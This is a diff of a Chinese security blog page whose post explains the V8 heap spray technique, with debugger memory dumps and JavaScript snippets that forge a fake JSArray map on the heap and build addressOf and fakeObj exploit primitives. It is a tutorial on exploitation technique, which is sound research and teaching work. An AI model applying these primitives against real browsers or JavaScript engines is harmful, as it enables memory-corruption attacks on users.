@@ -1,48 +1,153 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【V8】V8利用手法-HeapSpary | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【V8】V8利用手法-HeapSpary
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2024-09-20
+        <div class="post-title">
+            
+            
+                【V8】V8利用手法-HeapSpary
+            
+            
         </div>
-        <div class="post-md">
-            <blockquote>
+        <span class="post-date">
+            9月 20, 2024
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
 <p>本文讲解V8中的<strong>HeapSpary</strong>也就是常说的“堆喷”手法的基本原理和思想。后续会写一篇复现CVE-2021-38001的文章，讲解实际<strong>HeapSpary</strong>的利用和效果。</p>
 </blockquote>
 <h2 id="V8中的堆结构"><a href="#V8中的堆结构" class="headerlink" title="V8中的堆结构"></a>V8中的堆结构</h2><blockquote>
@@ -64,194 +169,163 @@
 <p>使用<code>vmmap</code>，我们可以找到其V8对应的堆区域大致在下图红框范围：</p>
 <p><img src="/img/article/v8-5/image-20240919162453479.png" alt="image-20240919162453479"></p>
 <p>其中<code>0x331e08240000     0x331f00000000 ---p f7dc0000      0 [anon_331e08240]</code>这一部分表示尚未分配的内存区域。为了方便观察结构，我们可以new一个较大的Array，使其从0x331e08240000这里进行新的分割，而不是从其他区域选择之前废弃的堆块。如下代码，我们分配一个0x8000的Array</p>
-<pre><code class="javascript">a = Array(0x8000);
-%DebugPrint(a);
-%SystemBreak();
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="title class_">Array</span>(<span class="number">0x8000</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
 <p>对比两者<code>vmmap</code>结果，可以注意到红线这里的确新分割出了一片区域，区域Size从<strong>0x80000</strong>增长至<strong>0xa3000</strong></p>
 <p><img src="/img/article/v8-5/image-20240919164440374.png" alt="image-20240919164440374"></p>
 <p>我们直接查看多出来区域的内容也就是<code>0x28ce081c0000+0x80000</code>如下</p>
-<pre><code class="sh">pwndbg&gt; x/20gx 0x28ce081c0000 + 0x80000
-0x28ce08240000: 0x0000000000023000      0x0000000000000032
-0x28ce08240010: 0x0000561bce413c58      0x000028ce08242118
-0x28ce08240020: 0x000028ce08262120      0x0000000000020008
-0x28ce08240030: 0x0000000000000000      0x0000000000002118
-0x28ce08240040: 0x0000561bce496b40      0x0000561bce405ca0
-0x28ce08240050: 0x000028ce08240000      0x0000000000023000
-0x28ce08240060: 0x0000000000000000      0x0000000000000000
-0x28ce08240070: 0x0000000000000000      0x0000000000000000
-0x28ce08240080: 0x0000000000000000      0x0000000000000000
-0x28ce08240090: 0x0000000000000000      0x0000000000000000
-</code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x28ce081c0000 + 0x80000</span><br><span class="line">0x28ce08240000: 0x0000000000023000      0x0000000000000032</span><br><span class="line">0x28ce08240010: 0x0000561bce413c58      0x000028ce08242118</span><br><span class="line">0x28ce08240020: 0x000028ce08262120      0x0000000000020008</span><br><span class="line">0x28ce08240030: 0x0000000000000000      0x0000000000002118</span><br><span class="line">0x28ce08240040: 0x0000561bce496b40      0x0000561bce405ca0</span><br><span class="line">0x28ce08240050: 0x000028ce08240000      0x0000000000023000</span><br><span class="line">0x28ce08240060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x28ce08240070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x28ce08240080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x28ce08240090: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
 <p>通过阅读其他的文章以及一些自己的猜测，我们基本能判断出部分偏移处的含义:</p>
 <ul>
-<li>**0x0: **表示整个结构的大小为0x23000，经过多次测试，新分割的块似乎以0x1000进行对齐</li>
-<li>**0x18: **已有数据块内容的起始地址</li>
-<li>**0x20: **空闲区域的起始地址</li>
-<li>**0x28: **已有数据块的大小<code>0x20008 = 0x8000 * 4 + 0x8 = 0x000028ce08262120 - 0x000028ce08242118</code></li>
-<li>**0x28: **结构头的大小0x2118</li>
+<li><strong>0x0:</strong> 表示整个结构的大小为0x23000，经过多次测试，新分割的块似乎以0x1000进行对齐</li>
+<li><strong>0x18:</strong> 已有数据块内容的起始地址</li>
+<li><strong>0x20:</strong> 空闲区域的起始地址</li>
+<li><strong>0x28:</strong> 已有数据块的大小<code>0x20008 = 0x8000 * 4 + 0x8 = 0x000028ce08262120 - 0x000028ce08242118</code></li>
+<li><strong>0x28:</strong> 结构头的大小0x2118</li>
 </ul>
 <blockquote>
 <p>如果不太熟悉V8的对象结构，可能会疑惑为什么数据块大小额外要加0x8，这里的0x8其实就是elements结构的前两个部分：<strong>32 bit map addr</strong>和<strong>32 bit length</strong>，之后紧接着的就是实际存储的数据了。具体可以看我之前的文章：<a href="https://loora1n.github.io/2024/07/25/%E3%80%90V8%E3%80%91%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/">V8通用利用链研究</a></p>
 </blockquote>
 <p> 从<code>DebugPrint</code>的输出，我们也能确定数据的起始地址为<code>0x28ce08242119 - 1</code></p>
-<pre><code class="sh">DebugPrint: 0x28ce08049941: [JSArray]
-...
- - elements: 0x28ce08242119 &lt;FixedArray[32768]&gt; &#123;
-     0-32767: 0x28ce0800242d &lt;the_hole&gt;
- &#125;
- ...
-</code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x28ce08049941: [JSArray]</span><br><span class="line">...</span><br><span class="line"> - elements: 0x28ce08242119 &lt;FixedArray[32768]&gt; &#123;</span><br><span class="line">     0-32767: 0x28ce0800242d &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+
 <h2 id="堆喷的基本思想"><a href="#堆喷的基本思想" class="headerlink" title="堆喷的基本思想"></a>堆喷的基本思想</h2><h3 id="获取堆地址"><a href="#获取堆地址" class="headerlink" title="获取堆地址"></a>获取堆地址</h3><p>在上述我们可以继续扩大下Array的大小，使其以0x40000对齐，<code>(0x40000 -0x3000) / 4 = 0xF400</code>。计算得到可以更改Array大小为0xF400进行测试</p>
 <blockquote>
 <p>其中0x3000由0x2118以0x1000对齐可得，4是指向空元素<code>the_hole</code>的压缩指针长度</p>
 </blockquote>
-<pre><code class="javascript">a = Array(0xF400);
-%DebugPrint(a);
-%SystemBreak();
-</code></pre>
-<p>查看结构</p>
-<pre><code class="sh">pwndbg&gt; x/20gx 0x411081c0000 + 0x80000
-0x41108240000:  0x0000000000040000      0x0000000000000032
-0x41108240010:  0x00005575eaef8c58      0x0000041108242118
-0x41108240020:  0x000004110827f120      0x000000000003d008
-0x41108240030:  0x0000000000000000      0x0000000000002118
-0x41108240040:  0x00005575eaf7bb40      0x00005575eaeeaca0
-0x41108240050:  0x0000041108240000      0x0000000000040000
-0x41108240060:  0x0000000000000000      0x0000000000000000
-0x41108240070:  0x0000000000000000      0x0000000000000000
-0x41108240080:  0x0000000000000000      0x0000000000000000
-0x41108240090:  0x0000000000000000      0x0000000000000000
-</code></pre>
-<p>可以注意到分割的大小确实是0x40000。另外，由于现在分割块以0x40000对齐，从而保证了低两字节的块起始地址恒为0x0000。导致数据的起始地址变为低两字节恒为<code>0x2118</code>，也就是分割块的头部大小。同时我们观察Debug输出，也能注意到<code>elements</code>的地址第两位为<code>0x2119 = 0x2118 + 1</code>。</p>
-<pre><code class="sh"># 这里的地址和前面的高位并不一样，是因为我又重新跑了一边，之前的结果忘记复制了😂，反正关注点主要在后4字节
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="title class_">Array</span>(<span class="number">0xF400</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
 
-DebugPrint: 0x28fa08049941: [JSArray]
- - map: 0x28fa08203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]
- - prototype: 0x28fa081cc0e9 &lt;JSArray[0]&gt;
- - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; [HOLEY_SMI_ELEMENTS]
- - length: 62464
- - properties: 0x28fa0800222d &lt;FixedArray[0]&gt;
- - All own properties (excluding elements): &#123;
-    0x28fa080048f1: [String] in ReadOnlySpace: #length: 0x28fa0814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
- &#125;
- - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; &#123;
-     0-62463: 0x28fa0800242d &lt;the_hole&gt;
- &#125;
-</code></pre>
+<p>查看结构</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x411081c0000 + 0x80000</span><br><span class="line">0x41108240000:  0x0000000000040000      0x0000000000000032</span><br><span class="line">0x41108240010:  0x00005575eaef8c58      0x0000041108242118</span><br><span class="line">0x41108240020:  0x000004110827f120      0x000000000003d008</span><br><span class="line">0x41108240030:  0x0000000000000000      0x0000000000002118</span><br><span class="line">0x41108240040:  0x00005575eaf7bb40      0x00005575eaeeaca0</span><br><span class="line">0x41108240050:  0x0000041108240000      0x0000000000040000</span><br><span class="line">0x41108240060:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x41108240070:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x41108240080:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x41108240090:  0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以注意到分割的大小确实是0x40000。另外，由于现在分割块以0x40000对齐，从而保证了低两字节的块起始地址恒为0x0000。导致数据的起始地址变为低两字节恒为<code>0x2118</code>，也就是分割块的头部大小。同时我们观察Debug输出，也能注意到<code>elements</code>的地址第两位为<code>0x2119 = 0x2118 + 1</code>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里的地址和前面的高位并不一样，是因为我又重新跑了一边，之前的结果忘记复制了😂，反正关注点主要在后4字节</span></span><br><span class="line"></span><br><span class="line">DebugPrint: 0x28fa08049941: [JSArray]</span><br><span class="line"> - map: 0x28fa08203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x28fa081cc0e9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 62464</span><br><span class="line"> - properties: 0x28fa0800222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x28fa080048f1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x28fa0814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; &#123;</span><br><span class="line">     0-62463: 0x28fa0800242d &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
 <p>我们又知V8中地址的存储经常使用指针压缩的方式，所以只需关注低32位即可。</p>
 <blockquote>
 <p>指针压缩详细内容可以看看这篇文章：<a target="_blank" rel="noopener" href="https://v8.js.cn/blog/pointer-compression/">https://v8.js.cn/blog/pointer-compression/</a></p>
 <p>起始只需关注下压缩指针和解压指针的代码就很清楚了</p>
-<pre><code class="c">/***	压缩	***/
-uint64_t uncompressed_tagged;
-uint32_t compressed_tagged = uint32_t(uncompressed_tagged);
-
-/***	解压	***/
-uint32_t compressed_tagged;
-
-uint64_t uncompressed_tagged;
-if (compressed_tagged &amp; 1) &#123;
-  // pointer case
-  uncompressed_tagged = base + uint64_t(compressed_tagged);
-&#125; else &#123;
-  // Smi case
-  uncompressed_tagged = int64_t(compressed_tagged);
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***	压缩	***/</span></span><br><span class="line"><span class="type">uint64_t</span> uncompressed_tagged;</span><br><span class="line"><span class="type">uint32_t</span> compressed_tagged = <span class="type">uint32_t</span>(uncompressed_tagged);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***	解压	***/</span></span><br><span class="line"><span class="type">uint32_t</span> compressed_tagged;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> uncompressed_tagged;</span><br><span class="line"><span class="keyword">if</span> (compressed_tagged &amp; <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="comment">// pointer case</span></span><br><span class="line">  uncompressed_tagged = base + <span class="type">uint64_t</span>(compressed_tagged);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Smi case</span></span><br><span class="line">  uncompressed_tagged = <span class="type">int64_t</span>(compressed_tagged);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>在多次运行后，我们可以注意到另一个有趣的现象，下面是几次<code>elements</code>的不同结果</p>
-<pre><code>- elements: 0x28fa08242119
-- elements: 0x29cb08242119
-- elements: 0x1e5e08242119
-- elements: 0x24ee08242119
-...
-</code></pre>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- elements: 0x28fa08242119</span><br><span class="line">- elements: 0x29cb08242119</span><br><span class="line">- elements: 0x1e5e08242119</span><br><span class="line">- elements: 0x24ee08242119</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 <p>可以很容易注意到，不仅仅低16bit完全相同，整个低32位都是完全相同的，也就是说<code>elements</code>对应的压缩地址是完全固定的，因而我们可以通过合理划分块来获得<code>elements</code>的地址。</p>
 <blockquote>
 <p>这里的地址固定，是因为整个堆区域的起始，都是从0x00000000开始(低32bit)，且整个空间区域地址连续，从之前的vmmap图我们也能观察到这点。因此在JS脚本不变的情况下，堆区域的分配基本只受到d8版本的影响，从而使得堆喷的成功率大大提高。</p>
 </blockquote>
 <h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>通过上述的内容，我们清楚了用堆喷来泄露可控堆地址的基本思想，在此基础上，我们可以考虑在堆上伪造对象结构，比如这里我们可以尝试伪造一个<strong>存储Double类型数据的JSArray对象</strong>。</p>
 <p>首先需要伪造JSArray对应的<code>array_map</code>对象</p>
-<pre><code class="js">elemetns_addr = 0x08282119
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elemetns_addr = <span class="number">0x08282119</span></span><br><span class="line"></span><br><span class="line">double_array_map_value0 = <span class="title function_">itof</span>(<span class="number">0x1604040408002119n</span>);</span><br><span class="line">double_array_map_value1 = <span class="title function_">itof</span>(<span class="number">0x0a0007ff15000834n</span>);</span><br><span class="line"></span><br><span class="line">a[<span class="number">0x1000</span>/<span class="number">0x8</span>] = double_array_map_value0;</span><br><span class="line">a[<span class="number">0x1008</span>/<span class="number">0x8</span>] = double_array_map_value1;</span><br><span class="line"></span><br><span class="line">array_map_addr = elemetns_addr + <span class="number">0x1000</span> + <span class="number">0x8</span>;</span><br></pre></td></tr></table></figure>
 
-double_array_map_value0 = itof(0x1604040408002119n);
-double_array_map_value1 = itof(0x0a0007ff15000834n);
-
-a[0x1000/0x8] = double_array_map_value0;
-a[0x1008/0x8] = double_array_map_value1;
-
-array_map_addr = elemetns_addr + 0x1000 + 0x8;
-</code></pre>
 <blockquote>
 <p>在map结构中这里的value0和value1也基本是固定值，应该直接找个结构复制出来即可，在js对象进行读写时，并不检查完整的map结构，而是根据这里的特征值来判断元素类型。</p>
 </blockquote>
 <p>然后伪造JSArray主体部分</p>
-<pre><code class="js">fake_elements = elemetns_addr + 0x2000;
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fake_elements = elemetns_addr + <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">a[<span class="number">0x0</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(double_array_map_addr, <span class="number">0</span>); <span class="comment">//map, prototype</span></span><br><span class="line">a[<span class="number">0x8</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(fake_elements, <span class="number">0x2</span>); <span class="comment">//elements, length</span></span><br><span class="line"></span><br><span class="line">fake_array_obj_addr = elements_addr + <span class="number">0x8</span>;</span><br></pre></td></tr></table></figure>
 
-a[0x0/0x8] = u2d(double_array_map_addr, 0); //map, prototype
-a[0x8/0x8] = u2d(fake_elements, 0x2); //elements, length
-
-fake_array_obj_addr = elements_addr + 0x8;
-</code></pre>
 <p>上述便是伪造一个结构的基本流程，了解了这个过程后，addressOf和fakeObject也会变得更加容易实现。另外，针对<strong>obj类型的Array map值</strong>用gdb动调复制得到如下</p>
-<pre><code class="js">obj_array_map_value0 = itof(0x1604040408002119n);
-obj_array_map_value1 = itof(0x0a0007ff15000834n);
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj_array_map_value0 = <span class="title function_">itof</span>(<span class="number">0x1604040408002119n</span>);</span><br><span class="line">obj_array_map_value1 = <span class="title function_">itof</span>(<span class="number">0x0a0007ff15000834n</span>);</span><br></pre></td></tr></table></figure>
+
 <h3 id="addressOf-amp-fakeObj"><a href="#addressOf-amp-fakeObj" class="headerlink" title="addressOf &amp; fakeObj"></a>addressOf &amp; fakeObj</h3><p>那么，我们可以写出<code>addressOf</code>和<code>fakeObj</code>函数的大致框架，其中evil代表我们在堆中伪造的Array对象</p>
-<pre><code class="js">function addressOf(obj)
-&#123;
-    a[0x0/0x8] = u2d(obj_array_map_addr + 1, 0);
-    evil[0] = obj;
-    a[0x0/0x8] = u2d(double_array_map_addr + 1, 0);
-    let addr = ftoi(evil[0]) - 1;
-    console.log(&quot;[*] address of obj is: 0x&quot; + hex(addr));
-    return addr;
-&#125;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    a[<span class="number">0x0</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(obj_array_map_addr + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    evil[<span class="number">0</span>] = obj;</span><br><span class="line">    a[<span class="number">0x0</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(double_array_map_addr + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title function_">ftoi</span>(evil[<span class="number">0</span>]) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] address of obj is: 0x&quot;</span> + <span class="title function_">hex</span>(addr));</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><code>fakeObj</code>部分如下</p>
-<pre><code class="js">function fakeObj(addr)
-&#123;
-    a[0x0/0x8] = u2d(double_array_map + 1,0);
-    evil[0] = itof(addr+1n);
-    a[0x0/0x8] = u2d(obj_array_map_addr + 1, 0);
-    let obj = evil[0];
-    return obj;
-&#125;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    a[<span class="number">0x0</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(double_array_map + <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    evil[<span class="number">0</span>] = <span class="title function_">itof</span>(addr+<span class="number">1n</span>);</span><br><span class="line">    a[<span class="number">0x0</span>/<span class="number">0x8</span>] = <span class="title function_">u2d</span>(obj_array_map_addr + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> obj = evil[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>总体来看，堆喷和对象伪造省去了我们在正常利用流程中泄露map地址的部分，我们可以更轻易的获取<strong>obj array和double array的map</strong>.</p>
 <blockquote>
 <p>下一篇文章将以CVE-2021-38001为例，讲解实际堆喷的利用</p>
 </blockquote>
 
-        </div>
+</div> 
 
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2024/09/12/%E3%80%90V8%E3%80%91%E6%97%A7%E7%89%88%E6%9C%ACV8%E7%BC%96%E8%AF%91jinja2%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
